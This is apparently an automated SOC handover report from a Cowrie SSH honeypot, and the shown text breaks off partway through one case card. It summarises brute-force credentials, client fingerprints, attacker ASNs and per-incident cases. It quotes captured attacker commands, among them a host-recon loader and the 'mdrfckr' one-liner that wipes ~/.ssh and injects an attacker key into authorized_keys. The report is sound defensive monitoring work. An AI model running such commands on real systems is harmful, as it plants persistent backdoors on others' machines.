# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-11 |
| **Generated At** | 2026-08-11T15:02:35Z |
| **Shift Time** | 15:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **285** |
| Confirmed Threats | **253** |
| False Positives Filtered | **32** (11.2%) |
| Unique Attacker IPs | **86** |
| Countries of Origin | **32** |
| High Severity Cases | **171** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **114** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **180** |
| Unique Credential Pairs | **147** |
| Unique Usernames | **68** |
| Unique Passwords | **101** |
| Successful Auth Pairs | **171** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 26 |
| `admin` | 19 |
| `debian` | 14 |
| `test` | 9 |
| `centos` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 9 |
| `1234` | 8 |
| `qwerty123` | 5 |
| `LeitboGi0ro` | 5 |
| `123456` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `qwerty1234` | 4 |
| `support` | `qqq111` | 4 |
| `blank` | `webmaster` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `hpc` | `hp@123` | `45.148.10.183` | 2026-08-11T12:55:46 |
| `Admin` | `0` | `203.75.170.63` | 2026-08-11T12:55:57 |
| `admin` | `123456789` | `92.118.39.77` | 2026-08-11T12:55:59 |
| `admin` | `1234567890` | `92.118.39.77` | 2026-08-11T12:57:52 |
| `config` | `ubuntu` | `182.225.134.13` | 2026-08-11T12:58:09 |
| `config` | `ubuntu` | `65.20.158.10` | 2026-08-11T12:58:16 |
| `admin` | `1q2w3e4r` | `92.118.39.77` | 2026-08-11T12:59:49 |
| `agave` | `agave` | `45.148.10.183` | 2026-08-11T13:01:10 |
| `admin` | `P@ssw0rd123` | `92.118.39.77` | 2026-08-11T13:01:52 |
| `Test` | `P@ssw0rd` | `111.70.32.2` | 2026-08-11T13:03:16 |
| `admin` | `abc123` | `92.118.39.77` | 2026-08-11T13:03:45 |
| `jito-solana` | `jito-solana` | `45.148.10.183` | 2026-08-11T13:03:57 |
| `admin` | `admin` | `163.7.1.156` | 2026-08-11T13:05:03 |
| `admin` | `admin123` | `92.118.39.77` | 2026-08-11T13:05:34 |
| `root` | `Welcome@123` | `37.187.244.59` | 2026-08-11T13:06:19 |
| `345gs5662d34` | `345gs5662d34` | `37.187.244.59` | 2026-08-11T13:06:21 |
| `root` | `3245gs5662d34` | `37.187.244.59` | 2026-08-11T13:06:22 |
| `firedancer` | `firedancer` | `45.148.10.183` | 2026-08-11T13:06:47 |
| `admin` | `letmein` | `92.118.39.77` | 2026-08-11T13:07:22 |
| `root` | `qwerty1234` | `200.232.114.71` | 2026-08-11T13:08:45 |
| `root` | `Diamond1` | `168.144.134.137` | 2026-08-11T13:08:46 |
| `345gs5662d34` | `345gs5662d34` | `168.144.134.137` | 2026-08-11T13:08:51 |
| `root` | `3245gs5662d34` | `168.144.134.137` | 2026-08-11T13:08:53 |
| `admin` | `pass123` | `92.118.39.77` | 2026-08-11T13:09:09 |
| `frankendancer` | `frankendancer` | `45.148.10.183` | 2026-08-11T13:09:28 |
| `admin` | `password` | `92.118.39.77` | 2026-08-11T13:10:58 |
| `admin` | `123456788` | `10.0.0.73` | 2026-08-11T13:12:27 |
| `admin` | `password1` | `92.118.39.77` | 2026-08-11T13:12:47 |
| `centos` | `dietpi` | `10.0.0.73` | 2026-08-11T13:13:45 |
| `admin` | `qwerty123` | `92.118.39.77` | 2026-08-11T13:14:40 |
| `hummingbot` | `hummingbot` | `45.148.10.183` | 2026-08-11T13:14:52 |
| `deploy` | `123admin` | `114.98.230.202` | 2026-08-11T13:15:46 |
| `admin` | `root123` | `92.118.39.77` | 2026-08-11T13:16:32 |
| `freqtrade` | `freqtrade` | `45.148.10.183` | 2026-08-11T13:17:36 |
| `admin1` | `123` | `92.118.39.77` | 2026-08-11T13:18:26 |
| `passivbot` | `passivbot` | `45.148.10.183` | 2026-08-11T13:20:21 |
| `admin1` | `1234` | `92.118.39.77` | 2026-08-11T13:20:26 |
| `admin1` | `admin123` | `92.118.39.77` | 2026-08-11T13:22:24 |
| `jesse` | `jesse` | `45.148.10.183` | 2026-08-11T13:23:06 |
| `sol` | `sol` | `2.57.122.238` | 2026-08-11T13:23:43 |
| `admin1` | `password1` | `92.118.39.77` | 2026-08-11T13:24:20 |
| `solana` | `solana` | `2.57.122.238` | 2026-08-11T13:25:27 |
| `octobot` | `octobot` | `45.148.10.183` | 2026-08-11T13:25:51 |
| `admin1` | `qwerty123` | `92.118.39.77` | 2026-08-11T13:26:12 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-08-11T13:27:16 |
| `administrator` | `123` | `92.118.39.77` | 2026-08-11T13:28:00 |
| `superalgos` | `superalgos` | `45.148.10.183` | 2026-08-11T13:28:36 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-08-11T13:29:01 |
| `administrator` | `1234` | `92.118.39.77` | 2026-08-11T13:29:49 |
| `admin` | `123456788` | `190.57.233.133` | 2026-08-11T13:30:24 |
| `admin` | `123456788` | `114.30.180.58` | 2026-08-11T13:30:33 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-08-11T13:30:35 |
| `gainium` | `gainium` | `45.148.10.183` | 2026-08-11T13:31:17 |
| `administrator` | `123abc` | `92.118.39.77` | 2026-08-11T13:31:41 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-08-11T13:32:12 |
| `administrator` | `1q2w3e4r` | `92.118.39.77` | 2026-08-11T13:33:33 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-08-11T13:33:48 |
| `gocryptotrader` | `gocryptotrader` | `45.148.10.183` | 2026-08-11T13:33:59 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-11T13:35:01 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-11T13:35:01 |
| `node` | `node` | `2.57.122.238` | 2026-08-11T13:35:22 |
| `administrator` | `admin123` | `92.118.39.77` | 2026-08-11T13:35:25 |
| `node` | `1234` | `2.57.122.238` | 2026-08-11T13:36:53 |
| `administrator` | `qwerty123` | `92.118.39.77` | 2026-08-11T13:37:11 |
| `root` | `qwerty1234` | `49.124.153.57` | 2026-08-11T13:37:54 |
| `root` | `qwerty1234` | `200.222.71.218` | 2026-08-11T13:38:02 |
| `node` | `123456` | `2.57.122.238` | 2026-08-11T13:38:27 |
| `apache` | `1234` | `92.118.39.77` | 2026-08-11T13:38:59 |
| `wolfbot` | `wolfbot` | `45.148.10.183` | 2026-08-11T13:39:24 |
| `root` | `Q1w2e3r4t5y6u7` | `106.75.26.244` | 2026-08-11T13:39:53 |
| `345gs5662d34` | `345gs5662d34` | `106.75.26.244` | 2026-08-11T13:40:01 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-08-11T13:40:09 |
| `backup` | `123` | `92.118.39.77` | 2026-08-11T13:40:54 |
| `eth` | `eth` | `2.57.122.238` | 2026-08-11T13:41:49 |
| `sol` | `sol` | `45.148.10.183` | 2026-08-11T13:42:11 |
| `backup` | `12345678` | `92.118.39.77` | 2026-08-11T13:42:48 |
| `centos` | `1qaz2wsx` | `197.251.249.117` | 2026-08-11T13:43:08 |
| `centos` | `1qaz2wsx` | `222.236.155.146` | 2026-08-11T13:43:17 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-08-11T13:43:23 |
| `backup` | `password` | `92.118.39.77` | 2026-08-11T13:44:42 |
| `alertmanager` | `alertmanager` | `45.148.10.183` | 2026-08-11T13:44:54 |
| `tron` | `tron` | `2.57.122.238` | 2026-08-11T13:44:55 |
| `trx` | `trx` | `2.57.122.238` | 2026-08-11T13:46:33 |
| `daemon` | `123456` | `92.118.39.77` | 2026-08-11T13:46:37 |
| `test` | `1q2w3e` | `10.0.0.73` | 2026-08-11T13:47:05 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-08-11T13:48:08 |
| `test` | `159753` | `10.0.0.73` | 2026-08-11T13:48:25 |
| `daemon` | `abc123` | `92.118.39.77` | 2026-08-11T13:48:32 |
| `test` | `1q2w3e` | `66.45.144.201` | 2026-08-11T13:48:43 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-08-11T13:49:40 |
| `apache` | `apache` | `45.148.10.183` | 2026-08-11T13:50:18 |
| `debian` | `123` | `92.118.39.77` | 2026-08-11T13:50:27 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-08-11T13:51:14 |
| `debian` | `1234` | `92.118.39.77` | 2026-08-11T13:52:19 |
| `solv` | `solv` | `2.57.122.238` | 2026-08-11T13:52:54 |
| `app` | `app` | `45.148.10.183` | 2026-08-11T13:53:03 |
| `debian` | `12345` | `92.118.39.77` | 2026-08-11T13:54:12 |
| `solv` | `1234` | `2.57.122.238` | 2026-08-11T13:54:34 |
| `appuser` | `appuser` | `45.148.10.183` | 2026-08-11T13:55:48 |
| `debian` | `123456` | `92.118.39.77` | 2026-08-11T13:56:01 |
| `solv` | `123456` | `2.57.122.238` | 2026-08-11T13:56:12 |
| `debian` | `12345678` | `92.118.39.77` | 2026-08-11T13:57:47 |
| `solv` | `12345678` | `2.57.122.238` | 2026-08-11T13:57:50 |
| `authcore` | `authcore` | `45.148.10.183` | 2026-08-11T13:58:36 |
| `debian` | `123456789` | `92.118.39.77` | 2026-08-11T13:59:35 |
| `debian` | `1234567890` | `92.118.39.77` | 2026-08-11T14:01:23 |
| `azureuser` | `azureuser` | `45.148.10.183` | 2026-08-11T14:01:25 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-08-11T14:02:40 |
| `debian` | `1q2w3e4r` | `92.118.39.77` | 2026-08-11T14:03:08 |
| `bdms` | `bdms` | `45.148.10.183` | 2026-08-11T14:04:05 |
| `validator` | `validator` | `2.57.122.238` | 2026-08-11T14:04:16 |
| `debian` | `abc123` | `92.118.39.77` | 2026-08-11T14:04:53 |
| `sol` | `sol123` | `2.57.122.238` | 2026-08-11T14:05:55 |
| `debian` | `admin123` | `92.118.39.77` | 2026-08-11T14:06:38 |
| `besu` | `besu` | `45.148.10.183` | 2026-08-11T14:06:48 |
| `test` | `159753` | `103.251.143.14` | 2026-08-11T14:07:08 |
| `sol` | `123` | `2.57.122.238` | 2026-08-11T14:07:33 |
| `debian` | `letmein` | `92.118.39.77` | 2026-08-11T14:08:20 |
| `sol` | `12345678` | `2.57.122.238` | 2026-08-11T14:09:11 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-11T14:09:20 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-11T14:09:21 |
| `bitcoin` | `bitcoin` | `45.148.10.183` | 2026-08-11T14:09:38 |
| `debian` | `pass123` | `92.118.39.77` | 2026-08-11T14:10:01 |
| `emilia` | `emilia` | `189.161.43.93` | 2026-08-11T14:10:15 |
| `345gs5662d34` | `345gs5662d34` | `189.161.43.93` | 2026-08-11T14:10:17 |
| `emilia` | `3245gs5662d34` | `189.161.43.93` | 2026-08-11T14:10:18 |
| `trading` | `trading` | `2.57.122.238` | 2026-08-11T14:10:51 |
| `debian` | `password` | `92.118.39.77` | 2026-08-11T14:11:44 |
| `claude` | `claude` | `45.148.10.183` | 2026-08-11T14:12:14 |
| `trader` | `trader` | `2.57.122.238` | 2026-08-11T14:12:36 |
| `debian` | `qwerty123` | `92.118.39.77` | 2026-08-11T14:13:30 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-08-11T14:14:13 |
| `blackbox_exporter` | `blackbox_exporter` | `45.148.10.183` | 2026-08-11T14:14:59 |
| `deploy` | `123` | `92.118.39.77` | 2026-08-11T14:15:16 |
| `bot` | `bot` | `2.57.122.238` | 2026-08-11T14:15:48 |
| `root` | `﻿------fuck------` | `221.229.106.252` | 2026-08-11T14:17:00 |
| `deploy` | `1234` | `92.118.39.77` | 2026-08-11T14:17:03 |
| `bot` | `123456` | `2.57.122.238` | 2026-08-11T14:17:26 |
| `bocapp` | `bocapp` | `45.148.10.183` | 2026-08-11T14:17:49 |
| `deploy` | `1234567890` | `92.118.39.77` | 2026-08-11T14:18:51 |
| `bot` | `12345` | `2.57.122.238` | 2026-08-11T14:19:07 |
| `cadvisor` | `cadvisor` | `45.148.10.183` | 2026-08-11T14:20:32 |
| `user` | `qwerty123` | `220.132.170.64` | 2026-08-11T14:23:21 |
| `test` | `test@123` | `45.148.10.183` | 2026-08-11T14:26:08 |
| `test` | `test@1234` | `45.148.10.183` | 2026-08-11T14:28:55 |
| `support` | `qqq111` | `10.0.0.73` | 2026-08-11T14:29:36 |
| `admin` | `admin1234` | `45.148.10.183` | 2026-08-11T14:31:34 |
| `admin` | `admin@1234` | `45.148.10.183` | 2026-08-11T14:34:22 |
| `root` | `000000` | `92.118.39.71` | 2026-08-11T14:39:38 |
| `root` | `admin@1234` | `45.148.10.183` | 2026-08-11T14:39:49 |
| `blank` | `webmaster` | `65.20.217.64` | 2026-08-11T14:41:40 |
| `root` | `111111` | `92.118.39.71` | 2026-08-11T14:41:46 |
| `blank` | `webmaster` | `49.206.194.29` | 2026-08-11T14:41:49 |
| `blank` | `webmaster` | `93.241.232.14` | 2026-08-11T14:41:53 |
| `blank` | `webmaster` | `182.60.128.241` | 2026-08-11T14:42:01 |
| `admin` | `Admin@123` | `45.148.10.183` | 2026-08-11T14:42:35 |
| `root` | `123` | `92.118.39.71` | 2026-08-11T14:44:10 |
| `noc` | `noc` | `45.148.10.183` | 2026-08-11T14:45:21 |
| `root` | `123123` | `92.118.39.71` | 2026-08-11T14:46:39 |
| `support` | `qqq111` | `196.219.75.143` | 2026-08-11T14:46:58 |
| `support` | `qqq111` | `119.160.166.237` | 2026-08-11T14:47:11 |
| `nxt` | `nxt` | `45.148.10.183` | 2026-08-11T14:48:05 |
| `root` | `123321` | `92.118.39.71` | 2026-08-11T14:48:55 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-11T14:49:50 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-11T14:49:51 |
| `ubuntu` | `4rfv$RFV` | `45.148.10.183` | 2026-08-11T14:50:50 |
| `root` | `1234` | `92.118.39.71` | 2026-08-11T14:51:14 |
| `centos` | `123` | `217.24.185.98` | 2026-08-11T14:52:06 |
| `centos` | `123` | `85.152.57.60` | 2026-08-11T14:52:12 |
| `root` | `12345` | `92.118.39.71` | 2026-08-11T14:53:19 |
| `test` | `testing@123` | `45.148.10.183` | 2026-08-11T14:53:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **285** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 132 |
| OpenSSH | 23 |
| libssh | 19 |
| Paramiko (Python) | 8 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 73 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 53 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 23 | 22 |
| `f555226df196...` | Mirai/variant | 12 | 5 |
| `a2de0f306611...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 73 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 53 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 23 | 22 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 53 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`, `92.118.39.77`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `37.187.244.59`, `189.161.43.93`, `106.75.26.244`, `168.144.134.137`, `114.98.230.202`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **86** |
| Unique ASNs | **65** |
| High-Risk ASNs | **50** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (171)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1395619ee3c1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 12:55 |
| **Last Seen** | 2026-08-11 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 12:55:46` | `cowrie.session.connect` |
| `2026-08-11 12:55:46` | `cowrie.client.version` |
| `2026-08-11 12:55:46` | `cowrie.client.kex` |
| `2026-08-11 12:55:46` | `cowrie.login.success` |
| `2026-08-11 12:55:47` | `cowrie.session.params` |
| `2026-08-11 12:55:47` | `cowrie.command.input` |
| `2026-08-11 12:55:47` | `cowrie.log.closed` |
| `2026-08-11 12:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb786d65f20

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-08-11 12:55 |
| **Last Seen** | 2026-08-11 12:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 12:55:54` | `cowrie.session.connect` |
| `2026-08-11 12:55:55` | `cowrie.client.version` |
| `2026-08-11 12:55:55` | `cowrie.client.kex` |
| `2026-08-11 12:55:57` | `cowrie.login.success` |
| `2026-08-11 12:55:58` | `cowrie.direct-tcpip.request` |
| `2026-08-11 12:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd6c8521efd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 12:55 |
| **Last Seen** | 2026-08-11 12:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 12:55:58` | `cowrie.session.connect` |
| `2026-08-11 12:55:58` | `cowrie.client.version` |
| `2026-08-11 12:55:58` | `cowrie.client.kex` |
| `2026-08-11 12:55:59` | `cowrie.login.success` |
| `2026-08-11 12:56:01` | `cowrie.session.params` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.success` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.command.input` |
| `2026-08-11 12:56:01` | `cowrie.log.closed` |
| `2026-08-11 12:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b77a4f0c7ea

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 12:57 |
| **Last Seen** | 2026-08-11 12:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 12:57:51` | `cowrie.session.connect` |
| `2026-08-11 12:57:51` | `cowrie.client.version` |
| `2026-08-11 12:57:51` | `cowrie.client.kex` |
| `2026-08-11 12:57:52` | `cowrie.login.success` |
| `2026-08-11 12:57:53` | `cowrie.session.params` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.success` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.command.input` |
| `2026-08-11 12:57:53` | `cowrie.log.closed` |
| `2026-08-11 12:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfedb7e9c921

| Field | Detail |
|---|---|
| **Source IP** | `182.225.134[.]13` |
| **First Seen** | 2026-08-11 12:58 |
| **Last Seen** | 2026-08-11 12:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 12:58:06` | `cowrie.session.connect` |
| `2026-08-11 12:58:07` | `cowrie.client.version` |
| `2026-08-11 12:58:07` | `cowrie.client.kex` |
| `2026-08-11 12:58:09` | `cowrie.login.success` |
| `2026-08-11 12:58:10` | `cowrie.direct-tcpip.request` |
| `2026-08-11 12:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.225.134[.]13` to AbuseIPDB if not already reported
- [ ] Block `182.225.134[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c11a3482f3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-08-11 12:58 |
| **Last Seen** | 2026-08-11 12:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 12:58:15` | `cowrie.session.connect` |
| `2026-08-11 12:58:15` | `cowrie.client.version` |
| `2026-08-11 12:58:15` | `cowrie.client.kex` |
| `2026-08-11 12:58:16` | `cowrie.login.success` |
| `2026-08-11 12:58:16` | `cowrie.direct-tcpip.request` |
| `2026-08-11 12:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7241ee0247cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 12:59 |
